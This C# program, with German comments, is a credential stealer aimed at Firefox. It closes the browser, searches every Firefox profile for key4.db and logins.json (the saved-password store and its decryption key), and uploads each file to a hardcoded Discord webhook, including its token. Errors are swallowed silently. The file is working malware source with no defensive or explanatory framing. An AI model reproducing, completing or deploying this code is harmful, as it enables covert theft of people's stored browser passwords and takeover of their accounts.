using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Net.Http;
using System.Security.AccessControl;

namespace Ggezl2p
{
    class Program
    {
        static void Main(string[] args)
        {
            //Firefox Open Check
            if (File.Exists(@"C:\Program Files\Mozilla Firefox\firefox.exe"))
            {
                if (IsFirefoxRunning())
                {
                    Console.WriteLine("Firefox is running. Closing Firefox...");
                    CloseFirefox();
                    Thread.Sleep(2000);
                }
                else
                {
                    Console.WriteLine("Firefox is not running. Opening Firefox...");
                    OpenFirefox();
                    Thread.Sleep(2000);
                    Console.WriteLine("Closing Firefox...");
                    CloseFirefox();
                    Thread.Sleep(2000);
                }

                static bool IsFirefoxRunning()
                {
                    Process[] processes = Process.GetProcessesByName("firefox");
                    return processes.Length > 0;
                }

                static void CloseFirefox()
                {
                    Process[] processes = Process.GetProcessesByName("firefox");
                    foreach (Process process in processes)
                    {
                        process.CloseMainWindow();
                        process.WaitForExit();
                    }
                }

                static void OpenFirefox()
                {
                    Process.Start(@"C:\Program Files\Mozilla Firefox\firefox.exe");
                }

                // Verzeichnis erstellen oder zurücksetzen
                DirectoryInfo dir = new DirectoryInfo(@"%temp%\a74Bas57M");
                try
                {
                    if (dir.Exists)
                    {
                        dir.Attributes = dir.Attributes & ~FileAttributes.ReadOnly;
                        dir.Delete(true);
                    }
                    dir.Create();
                    Console.Write("Verzeichnis erstellt.");
                }
                catch (Exception ex)
                {

                }

                //unterordner checken
                string sourceDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");
                string destDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "a74Bas57M", "Profiles");



                if (!Directory.Exists(destDir))
                {
                    Directory.CreateDirectory(destDir);
                    Console.WriteLine("Verzeichnis erstellt.");
                }

                try
                {
                    string webhookLink = "https://discord.com/api/webhooks/1093683641068044378/KCPO4Q-xlX3zcMR25Ukt5L8LnVw_YwbsGFVLjZE142Pb3Is-7OM0eOYuR2QMWr1Lv0Go";
                    string profileDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");

                    var dirs2 = new DirectoryInfo(profileDir).GetDirectories();
                    foreach (var subdir in dirs2)
                    {
                        var files = subdir.GetFiles("key4.db", SearchOption.AllDirectories)
                                            .Union(subdir.GetFiles("logins.json", SearchOption.AllDirectories));
                        foreach (var file in files)
                        {
                            string filePath = Path.Combine(subdir.FullName, file.Name);

                            using (HttpClient httpClient = new HttpClient())
                            {
                                MultipartFormDataContent form = new MultipartFormDataContent();
                                var fileBytes = System.IO.File.ReadAllBytes(filePath);
                                form.Add(new ByteArrayContent(fileBytes, 0, fileBytes.Length), "Data Base File", file.Name);
                                httpClient.PostAsync(webhookLink, form).Wait();
                                httpClient.Dispose();
                            }

                            Console.WriteLine($"Datei {file.Name} erfolgreich kopiert.");
                        }
                    }
                }
                catch
                {

                }

                //Webhook verschicken
                string Webhook_link = "https://discord.com/api/webhooks/1093683641068044378/KCPO4Q-xlX3zcMR25Ukt5L8LnVw_YwbsGFVLjZE142Pb3Is-7OM0eOYuR2QMWr1Lv0Go";
                string FilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "a74Bas57M", "Profiles", "key4.db");
            }
            else
            {
                Console.WriteLine("Firefox ist nicht Installiert...");
            }

        }
    }
}
